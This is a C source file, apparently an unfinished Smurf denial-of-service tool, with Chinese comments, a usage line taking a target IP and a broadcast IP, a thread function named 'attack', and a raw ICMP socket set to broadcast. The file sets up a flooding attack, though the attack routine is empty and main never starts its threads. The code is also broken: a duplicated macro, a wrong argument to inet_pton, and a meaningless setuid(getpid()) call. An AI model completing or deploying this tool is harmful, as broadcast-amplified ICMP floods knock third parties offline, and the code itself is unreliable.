#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>
#include <pthread.h>
#include "header/CRC16_check.h"
#include "header/init_header.h"

/* 最多線程數 */
#define MAXCHILD 128

/* 最多線程數 */
#define MAXCHILD 128

/* 原始套接字 */
int sockfd;

/* 程序活動標誌 */
static int alive = -1;

char dst_ip[20] = { 0 };
char brc_ip[20] = { 0 };

void *attack(void *addr_info){
    struct sockaddr_in *addr = (struct sockaddr_in *)addr_info;
    // binary form 
    uint32_t dst_ip_b;
    inet_pton(AF_INET, addr->sin_addr.s_addr, &dst_ip_b);
    uint32_t brc_ip_b;

 	char buf[100], sendbuf[100];   
	int len;
	struct iphdr ip_hdr;			//IP頭部

}



/* 信號處理函數,設置退出變量alive */
void sig_int(int signo){
	alive = 0;
}

/* 主函數 */
int main(int argc, char *argv[]){
    struct sockaddr_in addr;
    struct hostent *host = NULL;

    int i = 0;
    pthread_t pthread[MAXCHILD];
    int err = -1;
    int broadcast_pings = 1;

    alive = 1;
    /* 截取信號CTRL+C */
	signal(SIGINT, sig_int);

    /* 参數是否數量正鴂 */
	if(argc < 3 || argc > 3){
		printf("usage: smurf <IPaddress> <broadcastIP>\n");
		exit(1);
	}

    strncpy( dst_ip, argv[1], 16 );

	bzero(&addr, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(0);

	if(inet_addr(dst_ip) == INADDR_NONE){
		/* 為DNS地址，查詢並轉換成IP地址 */
		host = gethostbyname(argv[1]);
		if(host == NULL){
			perror("gethostbyname()");
			exit(1);
		}
		addr.sin_addr = *((struct in_addr*)(host->h_addr));
		strncpy( dst_ip, inet_ntoa(addr.sin_addr), 16 );
	}
	else
		addr.sin_addr.s_addr = inet_addr(dst_ip);

	printf("host ip=%s\n", inet_ntoa(addr.sin_addr));

	/* 建立原始socket */
	sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_ICMP);	
	if (sockfd < 0){
		perror("socket()");
		exit(1);
	}
	/* 設置IP選項 */
	if (setsockopt (sockfd, SOL_SOCKET, SO_BROADCAST, &broadcast_pings, sizeof(broadcast_pings)) < 0){
		perror("setsockopt()");
		exit(1);
	}  

	if(connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
	{
		perror("connect()");
		return(1);	
	}

	/* 將程序的權限修改為普通用户 */
	setuid(getpid());


}